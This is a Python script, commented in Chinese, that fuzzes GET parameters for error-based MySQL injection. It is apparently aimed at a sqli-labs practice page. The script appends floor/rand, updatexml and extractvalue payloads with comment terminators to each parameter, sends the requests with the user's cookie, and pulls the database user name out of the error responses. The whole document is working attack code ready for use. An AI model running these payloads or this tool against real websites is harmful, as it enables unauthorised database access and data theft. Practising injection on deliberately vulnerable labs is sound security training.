# Get型
# 报错注入
# 传递的url需要digit_char_Inject.py脚本测试后的payload，因为有可能是字符型的报错注入

import requests
from termcolor import cprint
import re
from urllib.parse import urlparse

class Fuzz:
    def __init__(self, url, cookie):
        self.url = url
        self.headers = {"cookie": cookie}
        self.Notes = ['--+', '-- ', '%23']  # 注释符
        self.error_payload = [
        ' and (select 1 from(select count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x from information_schema.character_sets group by x)a)',
        ' and (select 1 from (select count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))b from information_schema.tables group by b)a)',
        ' union select count(*),1,concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x from information_schema.tables group by x ',
        ' and (updatexml(1,concat(0x5e5e5e,(select user()),0x5e5e5e),1))',
        ' and (extractvalue(1,concat(0x5e5e5e,(select user()),0x5e5e5e)))'
        # ' and geometrycollection((select * from(select * from(select user())a)b))',
        # ' and multipoint((select * from(select * from(select user())a)b))',
        # ' and polygon((select * from(select * from(select user())a)b))',
        # ' and multipolygon((select * from(select * from(select user())a)b))',
        # ' and linestring((select * from(select * from(select user())a)b))',
        # ' and multilinestring((select * from(select * from(select user())a)b))',
        # ' and exp(~(select * from(select user())a))'
    ]
        self.error_payloads = [i+j for i in self.error_payload for j in self.Notes] # 将payload与过滤字符结合
        self.standard_length = len(requests.get(self.url, headers=self.headers).text)  # 正常url响应包的长度
        self.params = urlparse(self.url).query  # 获取url链接的参数
        self.paramsList = self.params.split('&')  # 将字符串型的参数改为以&分割的列表
        self.nums = len(self.paramsList) * len(self.error_payloads)  # 计算共请求次数
        cprint('[{}] 测试 : [{}] [{}]  :  {}'.format(self.nums, self.standard_length, self.url, self.params),
               'red')  # 打印正常包的响应长度
        self.num = 1  # 计数
        self.RedPayloads, self.YellowPayloads, self.BluePayloads, self.GreenPayloads = [], [], [], []

    def error_attack(self):
        for i in range(len(self.paramsList)):
            for error_payload in self.error_payloads:
                payload_param = self.paramsList[i] + error_payload  # 构造其中一个参数的payload
                payload = self.url.replace(self.paramsList[i], payload_param)  # 构造好的参数payload替换掉原先的参数
                ret = requests.get(url=payload, headers=self.headers).text
                payload_length = len(ret)
                print('[:{}:] 测试 ：[{}]{}'.format(self.num, payload_length, payload))
                if '^^^' in ret:
                    out_ret = '[+{}+] 报错注入 ：[{}] payload : {}'.format(self.num, payload_length, payload)
                    cprint(out_ret, 'red')
                    self.RedPayloads.append(out_ret)

                    cmp = '[\^][\^][\^](.*)[\^][\^][\^]'  # ^是元字符，所以要在方括号里并用斜杠去匹配^
                    user = re.search(cmp, ret).group(1)
                    cprint(user, 'red')

                elif 'SQL syntax' in ret or 'select user()' in ret:
                    out_ret = '[+{}+] [SQL syntax or select user()] [{}] payload : [{}]'.format(self.num, payload_length, payload)
                    cprint(out_ret, "yellow")
                    self.YellowPayloads.append(payload)
                elif payload_length != self.standard_length:
                    out_ret = '[${}$] 可能存在报错注入   [{}] payload : [{}]'.format(self.num, payload_length, payload)
                    cprint(out_ret, "blue")
                    self.BluePayloads.append(payload)
                else:
                    out_ret = '[-{}-] 不是报错注入 ：[{}] payload : {}'.format(self.num, payload_length, payload)
                    cprint(out_ret, 'green')
                    self.GreenPayloads.append(payload)
                self.num += 1

    def attack(self):
        self.error_attack()
        return self.RedPayloads, self.YellowPayloads, self.BluePayloads, self.GreenPayloads

url = 'http://demo.sqli.com/Less-6/?id=1"'
cookies = None
#url = "http://demo.sqli.com/Less-10/?id=1"
Fuzz(url, cookies).attack()